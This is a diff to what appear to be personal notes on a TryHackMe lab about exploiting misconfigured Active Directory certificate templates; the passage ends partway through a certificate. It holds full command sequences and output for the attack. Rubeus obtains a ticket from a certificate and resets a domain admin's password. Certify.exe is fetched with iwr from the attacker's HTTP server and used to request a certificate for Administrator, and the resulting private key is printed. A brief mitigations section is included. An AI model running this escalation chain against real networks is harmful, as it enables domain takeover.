@@ -577,3 +577,582 @@ C:\THMTools>.\Rubeus.exe asktgt /user:svc.gitlab /enctype:aes256 /certificate:C:
       4CmyYwd5qIrJOMvj/qBnR9I2nvHXLakVDPYgNYfp+zcNlzxwfwXgYQOSzehh+hHL7uBvXLBTjugnxkh2
       L8JJe/3Wy4+z4V6AsWhQLx8Z7MIy3WnuksuEz8ga3e2Ctf8XMgQQpFyAybOtFritZz/adXL+pKfkh6Kc
       Px7WrCUYX/Sy6XHBe1abMEA9bfSousjh7U9eeJoJKfPXUQwtDPCYOf9xkagJoSQzSY8joVtoIOTSCW4g
+      k3hsv5mgNFXFoY51HjqDvHs5AVo/2ksMH6CcHa1uzzcMZDUDwwK7YMSxevd9QeG1J0FZ843zOkybSis4
+      qFENWce/cVAo5b3tr0R/uoIDBTbQMVDCe94eV088CJ8gp+AedCAjjBLx/WH7qwo9YIwWtg7ZXp/Wu1gQ
+      zfyrVxzZrbfZBCgxUItgmRkubpZprX/OPKInC66/AiaG5RAEIdJ9NLLqFRp1X99XawnAwxCaI0hJ530X
+      /zvbSr4ODKKcYv9tSfkmcWQi64cnwaIP3an1QltlCm8fTr3pdnwEqWHEJIVORIFi8hSzryCXf3SqdL5M
+      lUQxKd3jVMQmRkw++aeo7aBdmFZTeIqyyzsfyP7nIveDiJXTBc3uX4jY6TNxl20j1l3pfx0uixEBmD2/
+      POnvQntqRCgsopm9++2P8JhxwRWwvghyOododg6qeVZ3qAJRQLr12+cbG4XJxKoEx8oiuhpnDWh5s1at
+      IPQCNVfHtOQvfm8w3r1cPek4MT9ZvJ3p4/Y7XF75Vvh/qV+X+SWEzZvUFD9uClna2ci92ZELGj8187DT
+      qhZMLZzod+yQz4B8BrxVvW4Ze5SIfWjN4CESgZwS5e36IIVA6lcfCSk21HKFlsCm/KWv57CeBEKg1M2U
+      ebMj//Kd9BHuDbaYuRjWyqLrKljFn5NaQEYrCvB2PLbuLJOtwlmCEnqU9tIBu/u7dehre197kdeyC8g6
+      7XenWwgg7VWAkfej718dfO/Fo9DlGSvhr6NC4kxtfAuy2SbIo4HxMIHuoAMCAQCigeYEgeN9geAwgd2g
+      gdowgdcwgdSgKzApoAMCARKhIgQg3832DqrnXYcqvcXlOqCSc/d8aLy/YveH0Q/uPyOYHKuhERsPTFVO
+      QVIuRVJVQ0EuQ09NohcwFaADAgEBoQ4wDBsKc3ZjLmdpdGxhYqMHAwUAQOEAAKURGA8yMDIzMDIxNjIy
+      MDE1M1qmERgPMjAyMzAyMTcwODAxNTNapxEYDzIwMjMwMjIzMjIwMTUzWqgRGw9MVU5BUi5FUlVDQS5D
+      T02pJDAioAMCAQKhGzAZGwZrcmJ0Z3QbD2x1bmFyLmVydWNhLmNvbQ==
+
+[*] Ticket written to svc.gitlab.kirbi
+
+  ServiceName              :  krbtgt/lunar.eruca.com
+  ServiceRealm             :  LUNAR.ERUCA.COM
+  UserName                 :  svc.gitlab
+  UserRealm                :  LUNAR.ERUCA.COM
+  StartTime                :  2/16/2023 10:01:53 PM
+  EndTime                  :  2/17/2023 8:01:53 AM
+  RenewTill                :  2/23/2023 10:01:53 PM
+  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
+  KeyType                  :  aes256_cts_hmac_sha1
+  Base64(key)              :  3832DqrnXYcqvcXlOqCSc/d8aLy/YveH0Q/uPyOYHKs=
+  ASREP (key)              :  DF239E189CEA50C908B720FB54553EC7196637F1A2B6249529FDD2FBBE019D6D
+
+C:\THMTools>cd C:\Users\Administrator
+Access is denied.
+
+C:\THMTools>.\Rubeus.exe changepw /ticket:svc.gitlab.kirbi /new:Tryhackme! /dc:LUNDC.lunar.eruca.com /targetuser:lunar.eruca.com\da-nread
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.0.0
+
+[*] Action: Reset User Password (AoratoPw)
+
+[*] Using domain controller: LUNDC.lunar.eruca.com (10.10.221.143)
+[*] Resetting password for target user: lunar.eruca.com\da-nread
+[*] New password value: Tryhackme!
+[*] Building AP-REQ for the MS Kpassword request
+[*] Building Authenticator with encryption key type: aes256_cts_hmac_sha1
+[*] base64(session subkey): 3aTfRgoViYIW1zUNrDuU7JbyysmakjG5USyhepge+hg=
+[*] Building the KRV-PRIV structure
+[+] Password change success!
+
+C:\THMTools>runas /user:lunar.eruca.com\da-nread cmd.exe
+Enter the password for lunar.eruca.com\da-nread:
+Attempting to start cmd.exe as user "lunar.eruca.com\da-nread" ...
+
+Microsoft Windows [Version 10.0.17763.1098]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+lunar\da-nread
+
+C:\Windows\system32>net user da-nread
+User name                    da-nread
+Full Name                    Naomi Read
+Comment
+User's comment
+Country/region code          000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            2/16/2023 10:07:00 PM
+Password expires             Never
+Password changeable          2/16/2023 10:07:00 PM
+Password required            Yes
+User may change password     Yes
+
+Workstations allowed         All
+Logon script
+User profile
+Home directory
+Last logon                   2/16/2023 10:07:57 PM
+
+Logon hours allowed          All
+
+Local Group Memberships
+Global Group memberships     *Domain Admins        *Domain Users
+The command completed successfully.
+
+C:\Windows\system32>cd C:\Users\Administrator
+
+C:\Users\Administrator>cd Desktop
+
+C:\Users\Administrator\Desktop>dir
+ Volume in drive C is Windows
+ Volume Serial Number is 1634-22A9
+
+ Directory of C:\Users\Administrator\Desktop
+
+01/14/2022  11:52 AM    <DIR>          .
+01/14/2022  11:52 AM    <DIR>          ..
+01/14/2022  11:52 AM                28 flag.txt
+               1 File(s)             28 bytes
+               2 Dir(s)  51,865,030,656 bytes free
+
+C:\Users\Administrator\Desktop>type flag.txt
+THM{AD.Certs.Can.Get.You.DA}
+```
+![[Pasted image 20230216170432.png]]
+What is the value of the flag stored on the Administrator's Desktop?
+### Mitigations and Fixes
+So how can you actually defend against these Certificate Template attacks?
+There isn't really an easy answer, but there are some good defense techniques:
+-   Review all the certificate templates in your organisation for poisonous parameter combinations. You can use [PSPKIAudit](https://github.com/GhostPack/PSPKIAudit) to assist with this.
+-   In cases where poisonous parameter combinations cannot be avoided, make sure that there are stopgaps such as having to require Admin Approval before the certificate will be issued.
+-   Update your playbooks. Most organisations' playbooks will include something along the lines of resetting the credentials for a compromised account. As pointed out here, that's not really going to remedy the persistent access. Therefore, reviewing certificates that were issued would be required and the malicious certificate will have to be revoked.
+Answer the questions below
+Read the above
+Completed
+### Conclusion
+That's a wrap!
+In this lab, we showed a possible method to exploit misconfigured AD certificate templates. As mentioned previously, there are several different potential toxic parameter combinations that you can look to exploit. Have a read through the SpecterOps whitepaper if you are interested in learning more. Since the lab contains a full Domain Controller and you now have DA access, you can look to configure your own certificate templates to play around with. Have fun!
+Answer the questions below
+Read the above
+Completed
+```text
+another way
+
+┌──(witty㉿kali)-[~/Downloads/Ghostpack-CompiledBinaries]
+└─$ ls
+ Certify.exe                        README.md             SharpDPAPI.exe
+'dotnet v3.5 compiled binaries'     RestrictedAdmin.exe   SharpDump.exe
+'dotnet v4.5 compiled binaries'     Rubeus.exe            SharpRoast.exe
+'dotnet v4.7.2 compiled binaries'   SafetyKatz.exe        SharpUp.exe
+ Koh.exe                            Seatbelt.exe          SharpWMI.exe
+ LockLess.exe                       SharpChrome.exe
+                                                                                   
+┌──(witty㉿kali)-[~/Downloads/Ghostpack-CompiledBinaries]
+└─$ python3 -m http.server 1337
+Serving HTTP on 0.0.0.0 port 1337 (http://0.0.0.0:1337/) ...
+10.10.221.143 - - [16/Feb/2023 17:16:23] "GET /Certify.exe HTTP/1.1" 200 -
+
+C:\THMTools>powershell
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+PS C:\THMTools> iwr http://10.8.19.103:1337/Certify.exe -outfile C:\THMTools\Certify.exe
+
+PS C:\THMTools> .\Certify.exe find /vulnerable
+
+   _____          _   _  __
+  / ____|        | | (_)/ _|
+ | |     ___ _ __| |_ _| |_ _   _
+ | |    / _ \ '__| __| |  _| | | |
+ | |___|  __/ |  | |_| | | | |_| |
+  \_____\___|_|   \__|_|_|  \__, |
+                             __/ |
+                            |___./
+  v1.0.0
+
+[*] Action: Find certificate templates
+[*] Using the search base 'CN=Configuration,DC=lunar,DC=eruca,DC=com'
+
+[*] Listing info about the Enterprise CA 'lunar-LUNDC-CA'
+
+    Enterprise CA Name            : lunar-LUNDC-CA
+    DNS Hostname                  : LUNDC.lunar.eruca.com
+    FullName                      : LUNDC.lunar.eruca.com\lunar-LUNDC-CA
+    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
+    Cert SubjectName              : CN=lunar-LUNDC-CA, DC=lunar, DC=eruca, DC=com
+    Cert Thumbprint               : 1801B99A99D23D0CF06A8676A1891FDD0F16C512
+    Cert Serial                   : 77420116D46A6586476B85BD5BF6A237
+    Cert Start Date               : 1/14/2022 7:21:18 AM
+    Cert End Date                 : 1/14/2027 7:31:16 AM
+    Cert Chain                    : CN=lunar-LUNDC-CA,DC=lunar,DC=eruca,DC=com
+    UserSpecifiedSAN              : Disabled
+    CA Permissions                :
+      Owner: BUILTIN\Administrators        S-1-5-32-544
+
+      Access Rights                                     Principal
+
+      Allow  Enroll                                     NT AUTHORITY\Authenticated UsersS-1-5-11
+      Allow  ManageCA, ManageCertificates               BUILTIN\Administrators        S-1-5-32-544
+      Allow  ManageCA, ManageCertificates               LUNAR\Domain Admins           S-1-5-21-3330634377-1326264276-632209373-512
+      Allow  ManageCA, ManageCertificates               LUNAR\Enterprise Admins       S-1-5-21-3330634377-1326264276-632209373-519
+    Enrollment Agent Restrictions : None
+
+[!] Vulnerable Certificates Templates :
+
+    CA Name                               : LUNDC.lunar.eruca.com\lunar-LUNDC-CA
+    Template Name                         : UserRequest
+    Schema Version                        : 2
+    Validity Period                       : 1 year
+    Renewal Period                        : 6 weeks
+    msPKI-Certificate-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT
+    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS, AUTO_ENROLLMENT_CHECK_USER_DS_CERTIFICATE
+    Authorized Signatures Required        : 0
+    pkiextendedkeyusage                   : Client Authentication, Encrypting File System, Secure Email
+    mspki-certificate-application-policy  : Client Authentication, Encrypting File System, Secure Email
+    Permissions
+      Enrollment Permissions
+        Enrollment Rights           : LUNAR\Domain Admins           S-1-5-21-3330634377-1326264276-632209373-512
+                                      LUNAR\Domain Users            S-1-5-21-3330634377-1326264276-632209373-513
+                                      LUNAR\Enterprise Admins       S-1-5-21-3330634377-1326264276-632209373-519
+                                      NT AUTHORITY\Authenticated UsersS-1-5-11
+      Object Control Permissions
+        Owner                       : LUNAR\Administrator           S-1-5-21-3330634377-1326264276-632209373-500
+        WriteOwner Principals       : LUNAR\Administrator           S-1-5-21-3330634377-1326264276-632209373-500
+                                      LUNAR\Domain Admins           S-1-5-21-3330634377-1326264276-632209373-512
+                                      LUNAR\Enterprise Admins       S-1-5-21-3330634377-1326264276-632209373-519
+        WriteDacl Principals        : LUNAR\Administrator           S-1-5-21-3330634377-1326264276-632209373-500
+                                      LUNAR\Domain Admins           S-1-5-21-3330634377-1326264276-632209373-512
+                                      LUNAR\Enterprise Admins       S-1-5-21-3330634377-1326264276-632209373-519
+        WriteProperty Principals    : LUNAR\Administrator           S-1-5-21-3330634377-1326264276-632209373-500
+                                      LUNAR\Domain Admins           S-1-5-21-3330634377-1326264276-632209373-512
+                                      LUNAR\Enterprise Admins       S-1-5-21-3330634377-1326264276-632209373-519
+
+    CA Name                               : LUNDC.lunar.eruca.com\lunar-LUNDC-CA
+    Template Name                         : HTTPSWebServer
+    Schema Version                        : 2
+    Validity Period                       : 2 years
+    Renewal Period                        : 6 weeks
+    msPKI-Certificate-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT
+    mspki-enrollment-flag                 : PUBLISH_TO_DS
+    Authorized Signatures Required        : 0
+    pkiextendedkeyusage                   : Client Authentication
+    mspki-certificate-application-policy  : Client Authentication
+    Permissions
+      Enrollment Permissions
+        Enrollment Rights           : LUNAR\Domain Admins           S-1-5-21-3330634377-1326264276-632209373-512
+                                      LUNAR\Enterprise Admins       S-1-5-21-3330634377-1326264276-632209373-519
+                                      NT AUTHORITY\Authenticated UsersS-1-5-11
+      Object Control Permissions
+        Owner                       : LUNAR\Administrator           S-1-5-21-3330634377-1326264276-632209373-500
+        WriteOwner Principals       : LUNAR\Administrator           S-1-5-21-3330634377-1326264276-632209373-500
+                                      LUNAR\Domain Admins           S-1-5-21-3330634377-1326264276-632209373-512
+                                      LUNAR\Enterprise Admins       S-1-5-21-3330634377-1326264276-632209373-519
+        WriteDacl Principals        : LUNAR\Administrator           S-1-5-21-3330634377-1326264276-632209373-500
+                                      LUNAR\Domain Admins           S-1-5-21-3330634377-1326264276-632209373-512
+                                      LUNAR\Enterprise Admins       S-1-5-21-3330634377-1326264276-632209373-519
+        WriteProperty Principals    : LUNAR\Administrator           S-1-5-21-3330634377-1326264276-632209373-500
+                                      LUNAR\Domain Admins           S-1-5-21-3330634377-1326264276-632209373-512
+                                      LUNAR\Enterprise Admins       S-1-5-21-3330634377-1326264276-632209373-519
+
+Certify completed in 00:00:15.8021412
+
+[!] Vulnerable Certificates Templates :
+
+    CA Name                               : LUNDC.lunar.eruca.com\lunar-LUNDC-CA
+    Template Name                         : UserRequest
+
+PS C:\THMTools> .\Certify.exe request /ca:LUNDC.lunar.eruca.com\lunar-LUNDC-CA /template:UserRequest /altname:Administrator
+
+   _____          _   _  __
+  / ____|        | | (_)/ _|
+ | |     ___ _ __| |_ _| |_ _   _
+ | |    / _ \ '__| __| |  _| | | |
+ | |___|  __/ |  | |_| | | | |_| |
+  \_____\___|_|   \__|_|_|  \__, |
+                             __/ |
+                            |___./
+  v1.0.0
+
+[*] Action: Request a Certificates
+
+[*] Current user context    : LUNAR\thm
+[*] No subject name specified, using current context as subject.
+
+[*] Template                : UserRequest
+[*] Subject                 : CN=Try THM. Hack Me, CN=Users, DC=lunar, DC=eruca, DC=com
+[*] AltName                 : Administrator
+
+[*] Certificate Authority   : LUNDC.lunar.eruca.com\lunar-LUNDC-CA
+
+[*] CA Response             : The certificate had been issued.
+[*] Request ID              : 15
+
+[*] cert.pem         :
+
+-----BEGIN RSA PRIVATE KEY-----
+MIIEpAIBAAKCAQEA4g63dRtvJxu/PI9jhQB/4kRoJJuHgAJSKpdofhsRxXbZfYNq
+HkI6Kl/Xik+4W4vBypDQabmt1VoGvmko9MuaR77SCMM15MDN57vHfhaTgz9oq+GP
+207HO4s9wh+9GoYUiQtg+Z/3VWMGOprDNuQU4sosKiLnNAHlA46Q4Ld99j0COHMw
+G/qKk1j8h32SCjirRzREIhT3DXCxZ1gZKBcHV3OQFhExpYTk7i8GVvJdgY3wRpFu
+VYHlgFjHF7ba8jOAgWMfMApzzJJx2bs2DXw1Gpp4ipMg9y+Zq3FhckYLozFTG2C1
+yanXIKYEfvhi7xZfqJ6bpzTn+HucBZIUTghvXQIDAQABAoIBAQDf76g5cFXqLgiB
+26HArcABy7ZHHXNbkfEHlDnFQteV/6hwN/C1zPGF7K++qj59IbN2EYMEWRYlVit8
+EPyrk85f6F50o70NwRm4yEJVW9QBnpz4OFij7iRbjhI97ecNEWniYM1OO/NuOMyA
+3bMo+0TdbV3W2ACleoL9xQssMVmsxOJe29fngLuG6FQaZwXLDJK13i/xn20iyrq3
+BbA/UgVntpiBwaJYyVuB/unckYhnF5o/bj5GdYpnfxf+C7W2n14b+mn5Uyts+xvc
+vjCEKtTxDyF67QDO5VzCqWn/3FcQf6LsbiVMFT/SpVoKXhTkRZGaWCcJdHZPSXLU
+RETcrbIZAoGBAPZjDqFvv3DQasV2M2FghRLox6k8zX43X9yPjaRC/uD0Voao8wh6
+67FJaDthIDujmnXhezq5NrUQ1U37x0lTRoPPPNZ2v9KVVTG3fkxQhZqATohi7GY+
+ny4/+WBx7IkAwct3oMzcRe6L8HlVrGSANNvb7YCFw9UqOUKGXXOgdeXDAoGBAOrg
+mz0PI7CVBkG4Gyms3tRNu6y6PN6mCcZpbVpSWe1switD7Tmx0dEjKX/YLaRgWDap
+mgocDcxUYOSuzh+lOwcj2njxM5UwPe7tnqjrJAJlWN6hkKYHCHOnMRI2WrKOiRmL
+oP0JZIYmvJtqkGlExAs9oDc9QEX/SjAuZbdI2GRfAoGARwg72ZLr8ExF2/O90F8R
+PmhZ15Kt86tnOaExRqAB9zy6DUx79H/rn0r4f9X6gvchusZszntDKGRX+omR5LPb
+ani+o13M45sl2pV6FepI+kfvXCaY3MlE/wJ2lLWDaeQL+urcMvN2PdWeWHy4nKjR
+lGkNSbZGxRfNNj6iholGNB0CgYAcYX2AmEa4vJkf8c4ecAwQ3T+zNGHMiYWe2vhi
+tJa3MLAZqECO+ySeP8Bw+T8yoI2oNUAuvosQSJXYrCKuAjoqt7Nbb9HK0iR5rW7B
+fIBCZdqiNCWVWj40M1yjlbvJ3Z1FX/DZAnyKFT4vDWZbwfpqXUzxv833Z0ygm8qg
+pgW3wwKBgQC3AdjTmd4Hy9/89bOZ/T+AVpSZ1rbPJl/a1MgE/pTTokbuKKASvYwY
+v3eLIkVxwNkVl1WSccugKwv06txUHUr0t+42qhEemwZSv7hvA7HePVqCSdU40Okw
+FOroN2LvavgtlXgn5JtBnJ6MBrGiSlr2dk99X+G4b7V0eEW5prPaCg==
+-----END RSA PRIVATE KEY-----
+-----BEGIN CERTIFICATE-----
+MIIGXTCCBUWgAwIBAgITGwAAAA8SWC5lmBQSNAAAAAAADzANBgkqhkiG9w0BAQsF
+ADBcMRMwEQYKCZImiZPyLGQBGRYDY29tMRUwEwYKCZImiZPyLGQBGRYFZXJ1Y2Ex
+FTATBgoJkiaJk/IsZAEZFgVsdW5hcjEXMBUGA1UEAxMObHVuYXItTFVOREMtQ0Ew
+HhcNMjMwMjE2MjIxMDE3WhcNMjQwMjE2MjIxMDE3WjBuMRMwEQYKCZImiZPyLGQB
+GRYDY29tMRUwEwYKCZImiZPyLGQBGRYFZXJ1Y2ExFTATBgoJkiaJk/IsZAEZFgVs
+dW5hcjEOMAwGA1UEAxMFVXNlcnMxGTAXBgNVBAMTEFRyeSBUSE0uIEhhY2sgTWUw
+ggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDiDrd1G28nG788j2OFAH/i
+RGgkm4eAAlIql2h+GxHFdtl9g2oeQjoqX9eKT7hbi8HKkNBpua3VWga+aSj0y5pH
+vtIIwzXkwM3nu8d+FpODP2ir4Y/bTsc7iz3CH70ahhSJC2D5n/dVYwY6msM25BTi
+yiwqIuc0AeUDjpDgt332PQI4czAb+oqTWPyHfZIKOKtHNEQiFPcNcLFnWBkoFwdX
+c5AWETGlhOTuLwZW8l2BjfBGkW5VgeWAWMcXttryM4CBYx8wCnPMknHZuzYNfDUa
+mniKkyD3L5mrcWFyRgujMVMbYLXJqdcgpgR++GLvFl+onpunNOf4e5wFkhROCG9d
+AgMBAAGjggMEMIIDADA+BgkrBgEEAYI3FQcEMTAvBicrBgEEAYI3FQiGqOlnh6jG
+PIaBlwSB4/0rhaHxS4FKhtO7NoHe8WACAWQCAQowKQYDVR0lBCIwIAYIKwYBBQUH
+AwIGCCsGAQUFBwMEBgorBgEEAYI3CgMEMA4GA1UdDwEB/wQEAwIFoDA1BgkrBgEE
+AYI3FQoEKDAmMAoGCCsGAQUFBwMCMAoGCCsGAQUFBwMEMAwGCisGAQQBgjcKAwQw
+RAYJKoZIhvcNAQkPBDcwNTAOBggqhkiG9w0DAgICAIAwDgYIKoZIhvcNAwQCAgCA
+MAcGBSsOAwIHMAoGCCqGSIb3DQMHMB0GA1UdDgQWBBSOGWCpLOT1xOobBw7j3RPf
+e2SPeDAoBgNVHREEITAfoB0GCisGAQQBgjcUAgOgDwwNQWRtaW5pc3RyYXRvcjAf
+BgNVHSMEGDAWgBSwVuQVDTCXfO6YFdLBHVWyW4dytTCB0QYDVR0fBIHJMIHGMIHD
+oIHAoIG9hoG6bGRhcDovLy9DTj1sdW5hci1MVU5EQy1DQSxDTj1MVU5EQyxDTj1D
+RFAsQ049UHVibGljJTIwS2V5JTIwU2VydmljZXMsQ049U2VydmljZXMsQ049Q29u
+ZmlndXJhdGlvbixEQz1sdW5hcixEQz1lcnVjYSxEQz1jb20/Y2VydGlmaWNhdGVS
+ZXZvY2F0aW9uTGlzdD9iYXNlP29iamVjdENsYXNzPWNSTERpc3RyaWJ1dGlvblBv
+aW50MIHHBggrBgEFBQcBAQSBujCBtzCBtAYIKwYBBQUHMAKGgadsZGFwOi8vL0NO
+PWx1bmFyLUxVTkRDLUNBLENOPUFJQSxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNl
+cyxDTj1TZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9uLERDPWx1bmFyLERDPWVydWNh
+LERDPWNvbT9jQUNlcnRpZmljYXRlP2Jhc2U/b2JqZWN0Q2xhc3M9Y2VydGlmaWNh
+dGlvbkF1dGhvcml0eTANBgkqhkiG9w0BAQsFAAOCAQEAHuDtHb95nYsXd+W0SwWO
+fQSEYPoYAWDiIW431UooP7NDkhJ4gumgNFOTGHRZJDGAH8Afm5OOScHoLrCkS1lH
+ZCUn8Rq88vRf+ZmfCO8E3Vd9BzzfWJSvzGu3NSNoHn9eKYFbT7zoegOpdlyWoyUT
+n1muTs9y17m6d7BjBEwR5k/TKtKJYkGMrwzETmozPTJyDpGuXcA+yTXLo+Mcwr7r
+UbYNA0LowCkE/U//2kFX4PtY/hGgCjD1gLC3NohW6NVjqGzWtrXfUm1kxQeqia9w
+2d39Cix0DgnetDCK7fw1p7ZYSd2qK30SxlK1C+5C1/CkI7X+W9fNNa1FrqQu2SaD
+zA==
+-----END CERTIFICATE-----
+
+[*] Convert with: openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
+
+Certify completed in 00:00:18.8281522
+
+┌──(witty㉿kali)-[~/Downloads/Ghostpack-CompiledBinaries]
+└─$ nano cert.pem        
+                                                                                   
+┌──(witty㉿kali)-[~/Downloads/Ghostpack-CompiledBinaries]
+└─$ cat cert.pem 
+-----BEGIN RSA PRIVATE KEY-----
+MIIEpAIBAAKCAQEA4g63dRtvJxu/PI9jhQB/4kRoJJuHgAJSKpdofhsRxXbZfYNq
+HkI6Kl/Xik+4W4vBypDQabmt1VoGvmko9MuaR77SCMM15MDN57vHfhaTgz9oq+GP
+207HO4s9wh+9GoYUiQtg+Z/3VWMGOprDNuQU4sosKiLnNAHlA46Q4Ld99j0COHMw
+G/qKk1j8h32SCjirRzREIhT3DXCxZ1gZKBcHV3OQFhExpYTk7i8GVvJdgY3wRpFu
+VYHlgFjHF7ba8jOAgWMfMApzzJJx2bs2DXw1Gpp4ipMg9y+Zq3FhckYLozFTG2C1
+yanXIKYEfvhi7xZfqJ6bpzTn+HucBZIUTghvXQIDAQABAoIBAQDf76g5cFXqLgiB
+26HArcABy7ZHHXNbkfEHlDnFQteV/6hwN/C1zPGF7K++qj59IbN2EYMEWRYlVit8
+EPyrk85f6F50o70NwRm4yEJVW9QBnpz4OFij7iRbjhI97ecNEWniYM1OO/NuOMyA
+3bMo+0TdbV3W2ACleoL9xQssMVmsxOJe29fngLuG6FQaZwXLDJK13i/xn20iyrq3
+BbA/UgVntpiBwaJYyVuB/unckYhnF5o/bj5GdYpnfxf+C7W2n14b+mn5Uyts+xvc
+vjCEKtTxDyF67QDO5VzCqWn/3FcQf6LsbiVMFT/SpVoKXhTkRZGaWCcJdHZPSXLU
+RETcrbIZAoGBAPZjDqFvv3DQasV2M2FghRLox6k8zX43X9yPjaRC/uD0Voao8wh6
+67FJaDthIDujmnXhezq5NrUQ1U37x0lTRoPPPNZ2v9KVVTG3fkxQhZqATohi7GY+
+ny4/+WBx7IkAwct3oMzcRe6L8HlVrGSANNvb7YCFw9UqOUKGXXOgdeXDAoGBAOrg
+mz0PI7CVBkG4Gyms3tRNu6y6PN6mCcZpbVpSWe1switD7Tmx0dEjKX/YLaRgWDap
+mgocDcxUYOSuzh+lOwcj2njxM5UwPe7tnqjrJAJlWN6hkKYHCHOnMRI2WrKOiRmL
+oP0JZIYmvJtqkGlExAs9oDc9QEX/SjAuZbdI2GRfAoGARwg72ZLr8ExF2/O90F8R
+PmhZ15Kt86tnOaExRqAB9zy6DUx79H/rn0r4f9X6gvchusZszntDKGRX+omR5LPb
+ani+o13M45sl2pV6FepI+kfvXCaY3MlE/wJ2lLWDaeQL+urcMvN2PdWeWHy4nKjR
+lGkNSbZGxRfNNj6iholGNB0CgYAcYX2AmEa4vJkf8c4ecAwQ3T+zNGHMiYWe2vhi
+tJa3MLAZqECO+ySeP8Bw+T8yoI2oNUAuvosQSJXYrCKuAjoqt7Nbb9HK0iR5rW7B
+fIBCZdqiNCWVWj40M1yjlbvJ3Z1FX/DZAnyKFT4vDWZbwfpqXUzxv833Z0ygm8qg
+pgW3wwKBgQC3AdjTmd4Hy9/89bOZ/T+AVpSZ1rbPJl/a1MgE/pTTokbuKKASvYwY
+v3eLIkVxwNkVl1WSccugKwv06txUHUr0t+42qhEemwZSv7hvA7HePVqCSdU40Okw
+FOroN2LvavgtlXgn5JtBnJ6MBrGiSlr2dk99X+G4b7V0eEW5prPaCg==
+-----END RSA PRIVATE KEY-----
+-----BEGIN CERTIFICATE-----
+MIIGXTCCBUWgAwIBAgITGwAAAA8SWC5lmBQSNAAAAAAADzANBgkqhkiG9w0BAQsF
+ADBcMRMwEQYKCZImiZPyLGQBGRYDY29tMRUwEwYKCZImiZPyLGQBGRYFZXJ1Y2Ex
+FTATBgoJkiaJk/IsZAEZFgVsdW5hcjEXMBUGA1UEAxMObHVuYXItTFVOREMtQ0Ew
+HhcNMjMwMjE2MjIxMDE3WhcNMjQwMjE2MjIxMDE3WjBuMRMwEQYKCZImiZPyLGQB
+GRYDY29tMRUwEwYKCZImiZPyLGQBGRYFZXJ1Y2ExFTATBgoJkiaJk/IsZAEZFgVs
+dW5hcjEOMAwGA1UEAxMFVXNlcnMxGTAXBgNVBAMTEFRyeSBUSE0uIEhhY2sgTWUw
+ggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDiDrd1G28nG788j2OFAH/i
+RGgkm4eAAlIql2h+GxHFdtl9g2oeQjoqX9eKT7hbi8HKkNBpua3VWga+aSj0y5pH
+vtIIwzXkwM3nu8d+FpODP2ir4Y/bTsc7iz3CH70ahhSJC2D5n/dVYwY6msM25BTi
+yiwqIuc0AeUDjpDgt332PQI4czAb+oqTWPyHfZIKOKtHNEQiFPcNcLFnWBkoFwdX
+c5AWETGlhOTuLwZW8l2BjfBGkW5VgeWAWMcXttryM4CBYx8wCnPMknHZuzYNfDUa
+mniKkyD3L5mrcWFyRgujMVMbYLXJqdcgpgR++GLvFl+onpunNOf4e5wFkhROCG9d
+AgMBAAGjggMEMIIDADA+BgkrBgEEAYI3FQcEMTAvBicrBgEEAYI3FQiGqOlnh6jG
+PIaBlwSB4/0rhaHxS4FKhtO7NoHe8WACAWQCAQowKQYDVR0lBCIwIAYIKwYBBQUH
+AwIGCCsGAQUFBwMEBgorBgEEAYI3CgMEMA4GA1UdDwEB/wQEAwIFoDA1BgkrBgEE
+AYI3FQoEKDAmMAoGCCsGAQUFBwMCMAoGCCsGAQUFBwMEMAwGCisGAQQBgjcKAwQw
+RAYJKoZIhvcNAQkPBDcwNTAOBggqhkiG9w0DAgICAIAwDgYIKoZIhvcNAwQCAgCA
+MAcGBSsOAwIHMAoGCCqGSIb3DQMHMB0GA1UdDgQWBBSOGWCpLOT1xOobBw7j3RPf
+e2SPeDAoBgNVHREEITAfoB0GCisGAQQBgjcUAgOgDwwNQWRtaW5pc3RyYXRvcjAf
+BgNVHSMEGDAWgBSwVuQVDTCXfO6YFdLBHVWyW4dytTCB0QYDVR0fBIHJMIHGMIHD
+oIHAoIG9hoG6bGRhcDovLy9DTj1sdW5hci1MVU5EQy1DQSxDTj1MVU5EQyxDTj1D
+RFAsQ049UHVibGljJTIwS2V5JTIwU2VydmljZXMsQ049U2VydmljZXMsQ049Q29u
+ZmlndXJhdGlvbixEQz1sdW5hcixEQz1lcnVjYSxEQz1jb20/Y2VydGlmaWNhdGVS
+ZXZvY2F0aW9uTGlzdD9iYXNlP29iamVjdENsYXNzPWNSTERpc3RyaWJ1dGlvblBv
+aW50MIHHBggrBgEFBQcBAQSBujCBtzCBtAYIKwYBBQUHMAKGgadsZGFwOi8vL0NO
+PWx1bmFyLUxVTkRDLUNBLENOPUFJQSxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNl
+cyxDTj1TZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9uLERDPWx1bmFyLERDPWVydWNh
+LERDPWNvbT9jQUNlcnRpZmljYXRlP2Jhc2U/b2JqZWN0Q2xhc3M9Y2VydGlmaWNh
+dGlvbkF1dGhvcml0eTANBgkqhkiG9w0BAQsFAAOCAQEAHuDtHb95nYsXd+W0SwWO
+fQSEYPoYAWDiIW431UooP7NDkhJ4gumgNFOTGHRZJDGAH8Afm5OOScHoLrCkS1lH
+ZCUn8Rq88vRf+ZmfCO8E3Vd9BzzfWJSvzGu3NSNoHn9eKYFbT7zoegOpdlyWoyUT
+n1muTs9y17m6d7BjBEwR5k/TKtKJYkGMrwzETmozPTJyDpGuXcA+yTXLo+Mcwr7r
